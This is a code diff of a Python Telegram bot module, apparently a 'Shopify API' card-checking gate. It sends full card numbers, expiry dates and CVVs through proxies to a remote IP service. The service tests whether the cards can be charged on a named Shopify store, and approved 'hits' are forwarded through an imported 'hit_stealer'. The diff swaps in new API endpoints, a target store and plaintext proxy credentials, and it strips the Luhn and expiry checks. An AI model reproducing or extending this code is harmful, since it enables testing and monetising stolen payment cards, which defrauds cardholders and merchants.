@@ -15,15 +15,13 @@ from BOT.tools.hit_stealer import send_hit_if_approved
 # Configuration
 # -------------------------------------------------------------
 GATE_NAME = "Shopify API"
-API_BASE = "http://147.93.53.240:5010/"
+API_BASE = "http://187.124.1.150:8081/"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 
-# Default site (can be changed per request)
-DEFAULT_SITE = "https://anseladams.org"
-
-# Default proxy
-DEFAULT_PROXY = "px023005.pointtoserver.com:10780:purevpn0s13918563:fV21iqc3trwCAs"
+# Default site and proxy (fallback if not provided)
+DEFAULT_SITE = "https://customsbyarrillc.myshopify.com"
+DEFAULT_PROXY = "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
 
 # Owner DM link and clickable symbol
 OWNER_DM = "https://t.me/spid_3r"
@@ -32,43 +30,19 @@ SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
 # -------------------------------------------------------------
 # Helper Functions
 # -------------------------------------------------------------
-def luhn_check(card_number):
-    digits = [int(ch) for ch in card_number if ch.isdigit()]
-    if not digits:
-        return False
-    odd_digits = digits[-1::-2]
-    even_digits = digits[-2::-2]
-    total = sum(odd_digits) + sum((2 * d) - 9 if 2 * d > 9 else 2 * d for d in even_digits)
-    return total % 10 == 0
+def extract_cards(text):
+    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
+    return re.findall(pattern, text)
 
-def is_expired(month_str, year_str):
-    try:
-        mm = int(month_str)
-        yy = int(year_str)
-    except ValueError:
-        return True
-    from datetime import datetime
-    current = datetime.now()
-    current_yy = current.year % 100
-    current_mm = current.month
-    if yy < current_yy or (yy == current_yy and mm < current_mm):
-        return True
-    return False
-
-def get_proxy_dict(proxy_str):
+def build_httpx_proxy(proxy_str):
+    """Convert proxy string (host:port:user:pass) to httpx proxy URL"""
     parts = proxy_str.split(':')
     if len(parts) == 2:
         host, port = parts
-        return {
-            'http': f'http://{host}:{port}',
-            'https': f'http://{host}:{port}'
-        }
+        return f"http://{host}:{port}"
     elif len(parts) == 4:
         host, port, user, pwd = parts
-        return {
-            'http': f'http://{user}:{pwd}@{host}:{port}',
-            'https': f'http://{user}:{pwd}@{host}:{port}'
-        }
+        return f"http://{user}:{pwd}@{host}:{port}"
     else:
         return None
 
@@ -81,7 +55,7 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, price, 
 
 {SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
 {SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
-{SYMBOL} 𝗣𝗿𝗶𝗰𝗲 ⇾ ${price}
+{SYMBOL} 𝗣𝗿𝗶𝗰𝗲 ⇾ {price}
 
 {SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
@@ -93,57 +67,53 @@ async def send_hit_to_stealer(client, fullcc, status, response, gateway, price, 
 # -------------------------------------------------------------
 # API caller
 # -------------------------------------------------------------
-async def call_shopify_api(fullcc, site_url=None, proxy=None):
+async def call_shopify_api(fullcc, site_url=None, proxy_str=None):
     """Call Shopify API to check credit card"""
     if site_url is None:
         site_url = DEFAULT_SITE
-    if proxy is None:
-        proxy = DEFAULT_PROXY
-    
-    params = {'url': site_url, 'proxy': proxy}
+    if proxy_str is None:
+        proxy_str = DEFAULT_PROXY
+
+    # Build the request URL
+    params = {'url': site_url, 'proxy': proxy_str}
     url = f"{API_BASE}?{fullcc}&{urlencode(params)}"
-    
-    proxy_dict = get_proxy_dict(proxy)
-    
-    async with httpx.AsyncClient(timeout=45, follow_redirects=True, proxies=proxy_dict) as session:
+
+    # Build httpx proxy (string or None)
+    proxy_url = build_httpx_proxy(proxy_str)
+
+    async with httpx.AsyncClient(timeout=45, follow_redirects=True, proxy=proxy_url) as session:
         for attempt in range(2):
             try:
                 resp = await session.get(url)
                 data = resp.json()
-                
+
                 response_msg = data.get("Response", "No response")
                 charged = data.get("Charged", "False")
                 approved = data.get("Approved", "False")
                 price = data.get("Price", "N/A")
-                
+                gate = data.get("Gate", GATE_NAME)
+
                 resp_lower = response_msg.lower()
-                
-                # Check for charged (successful payment)
-                if charged == "True" or "order completed" in resp_lower or "completed" in resp_lower:
-                    return "Charged 💎", f"{response_msg} (${price})", GATE_NAME, price
-                # Check for approved (auth only)
+
+                if charged == "True" or "order completed" in resp_lower:
+                    return "Charged 💎", f"{response_msg} ({price})", gate, price
                 elif approved == "True" or "otp_required" in resp_lower or "insufficient_funds" in resp_lower:
-                    return "Approved ✅", f"{response_msg} (${price})", GATE_NAME, price
-                # Check for declined
+                    return "Approved ✅", f"{response_msg} ({price})", gate, price
                 elif "proxy dead" in resp_lower:
-                    return "Error", "Proxy Dead - Retry with different proxy", GATE_NAME, price
-                elif "card_declined" in resp_lower or "generic_declined" in resp_lower or "generic_decline" in resp_lower:
-                    return "Declined ❌", f"{response_msg} (${price})", GATE_NAME, price
+                    return "Error", "Proxy Dead - Retry with different proxy", gate, price
+                elif "card_declined" in resp_lower or "generic_declined" in resp_lower:
+                    return "Declined ❌", f"{response_msg} ({price})", gate, price
                 elif "exhausted" in resp_lower:
-                    return "Declined ❌", "All proxies/sites exhausted", GATE_NAME, price
+                    return "Declined ❌", "All proxies/sites exhausted", gate, price
                 else:
-                    return "Unknown ❓", f"{response_msg} (${price})", GATE_NAME, price
-                    
+                    return "Unknown ❓", f"{response_msg} ({price})", gate, price
+
             except Exception as e:
                 if attempt == 1:
                     return "Error", f"Request failed: {str(e)[:30]}", GATE_NAME, "0"
                 await asyncio.sleep(1)
-    
-    return "Error", "Request failed after multiple attempts", GATE_NAME, "0"
 
-def extract_cards(text):
-    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
-    return re.findall(pattern, text)
+    return "Error", "Request failed after multiple attempts", GATE_NAME, "0"
 
 # -------------------------------------------------------------
 # SINGLE CHECK COMMAND (/sh)
@@ -176,14 +146,6 @@ async def shopify_api_cmd(Client, message):
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         gateway = GATE_NAME
-
-        # Validate card
-        if not luhn_check(cc):
-            await message.reply_text("❌ Invalid card number (Luhn check failed)", quote=True)
-            return
-        if is_expired(mes, ano):
-            await message.reply_text("❌ Card has expired", quote=True)
-            return
 
         firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
 
@@ -229,8 +191,7 @@ async def shopify_api_cmd(Client, message):
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
 
         await Client.edit_message_text(
             message.chat.id, 
@@ -282,27 +243,11 @@ async def shopify_api_mass_cmd(Client, message):
             await message.reply_text(resp, quote=True, parse_mode=enums.ParseMode.HTML)
             return
 
-        # Filter valid cards
-        valid_ccs = []
-        for cc_line in ccs:
-            parts = cc_line.split('|')
-            if len(parts) >= 3:
-                num, mm, yy = parts[0], parts[1], parts[2]
-                if luhn_check(num) and not is_expired(mm, yy):
-                    valid_ccs.append(cc_line)
-        
-        if len(valid_ccs) != len(ccs):
-            await message.reply(f"⚠️ Filtered out {len(ccs) - len(valid_ccs)} invalid/expired cards", quote=True)
-        
-        if not valid_ccs:
-            await message.reply("❌ No valid cards found after Luhn/expiry check", quote=True)
-            return
-
-        if len(valid_ccs) > MAX_MSC_LIMIT:
+        if len(ccs) > MAX_MSC_LIMIT:
             await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
-            valid_ccs = valid_ccs[:MAX_MSC_LIMIT]
+            ccs = ccs[:MAX_MSC_LIMIT]
 
-        await process_sequential_check(Client, message, valid_ccs, user_id, first_name, role)
+        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
@@ -348,27 +293,11 @@ async def shopify_api_txt_cmd(Client, message):
             await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
             return
 
-        # Filter valid cards
-        valid_ccs = []
-        for cc_line in ccs:
-            parts = cc_line.split('|')
-            if len(parts) >= 3:
-                num, mm, yy = parts[0], parts[1], parts[2]
-                if luhn_check(num) and not is_expired(mm, yy):
-                    valid_ccs.append(cc_line)
-
-        if len(valid_ccs) != len(ccs):
-            await message.reply(f"⚠️ Filtered out {len(ccs) - len(valid_ccs)} invalid/expired cards", quote=True)
-
-        if not valid_ccs:
-            await message.reply("❌ No valid cards found after Luhn/expiry check", quote=True)
-            return
-
-        if len(valid_ccs) > MAX_TSC_LIMIT:
+        if len(ccs) > MAX_TSC_LIMIT:
             await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
-            valid_ccs = valid_ccs[:MAX_TSC_LIMIT]
+            ccs = ccs[:MAX_TSC_LIMIT]
 
-        await process_sequential_check(Client, message, valid_ccs, user_id, first_name, role)
+        await process_sequential_check(Client, message, ccs, user_id, first_name, role)
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
@@ -384,7 +313,7 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
     declined_count = 0
     gateway = GATE_NAME
     start_time = time.perf_counter()
-    approved_cards = []  # will store both charged and approved
+    approved_cards = []
 
     # Initial progress message
     progress_text = f"""Shopify API
@@ -488,8 +417,7 @@ Checked by: {first_name} ({role})""",
 {SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
 
 {SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
-{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
-{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
         await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
         await asyncio.sleep(0.5)
 
